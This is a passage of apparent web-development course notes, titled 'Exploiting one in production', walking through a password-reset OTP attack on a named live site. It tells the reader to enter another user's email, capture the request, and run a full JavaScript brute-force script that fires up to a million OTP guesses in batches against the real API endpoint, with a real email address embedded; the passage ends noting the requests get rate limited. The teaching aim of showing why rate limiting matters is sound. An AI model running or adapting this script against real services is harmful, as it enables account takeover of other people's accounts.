# Exploiting one in production

Try resetting password on [https://harkirat.classx.co.in](https://harkirat.classx.co.in/new-courses/2)

1.  Go to the website

2.  Put in a random users email

3.  Send OTP

4.  Try putting a random OTP

![notion image](https://www.notion.so/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F085e8ad8-528e-47d7-8922-a23dc4016453%2F6a05aa9e-bccf-461e-a03a-672049c8346c%2FScreenshot_2024-04-20_at_4.52.36_PM.png?table=block&id=833b43e9-8283-4815-8fab-3e55a4618b7e&cache=v2)

#### 

[](#5f8d30e566e64998a5d3736c725ff331 "Exploiting it")Exploiting it

*   Copy over the request from the network tab as `curl`

*   Paste it in Postman

![notion image](https://www.notion.so/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F085e8ad8-528e-47d7-8922-a23dc4016453%2Fc3725ac2-9a32-489b-877e-1a6a64aad083%2FScreenshot_2024-04-20_at_4.53.21_PM.png?table=block&id=71c4d1cd-1d37-4b73-8125-3da191a5e1ea&cache=v2)

*   Send a request via postman

*   Export the request

![notion image](https://www.notion.so/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F085e8ad8-528e-47d7-8922-a23dc4016453%2Fda6d3cec-d706-4dc7-82e4-49f2930fa706%2FScreenshot_2024-04-20_at_4.55.07_PM.png?table=block&id=b02f2453-d025-41d4-a7ef-53e153b512de&cache=v2)

*   Update the script to brute force on this endpoint

```javascript
import axios from "axios";

async function sendRequest(otp: number) {
  let config = {
    method: 'get',
    maxBodyLength: Infinity,
    url: 'https://harkiratapi.classx.co.in/get/otpverify?useremail=harkirat.iitr%40gmail.com&otp=' + otp,
    headers: { 
      'accept': '*/*', 
      'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 
      'auth-key': 'appxapi', 
      'client-service': 'Appx', 
      'device-type': '', 
      'origin': 'https://harkirat.classx.co.in', 
      'priority': 'u=1, i', 
      'referer': 'https://harkirat.classx.co.in/', 
      'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"', 
      'sec-ch-ua-mobile': '?0', 
      'sec-ch-ua-platform': '"macOS"', 
      'sec-fetch-dest': 'empty', 
      'sec-fetch-mode': 'cors', 
      'sec-fetch-site': 'same-site', 
      'source': 'website', 
      'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
    }
  };

  try {
    await axios.request(config);
  } catch (error) {
    console.error(error);
  }
}

async function main() {
  for (let i = 0; i < 1000000; i+=100) {
    const promises = [];
    console.log("here for " + i);
    for (let j = 0; j < 100; j++) {
      promises.push(sendRequest(i + j))
    }
    await Promise.all(promises);
  }
}

main()
```

Youâ€™ll get `rate limitted`

![notion image](https://www.notion.so/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F085e8ad8-528e-47d7-8922-a23dc4016453%2F7db48ad8-2a57-401b-b9dc-554fd0adb3d0%2FScreenshot_2024-04-20_at_4.56.49_PM.png?table=block&id=f32a6809-5b13-4c32-a282-edd19ff8909b&cache=v2)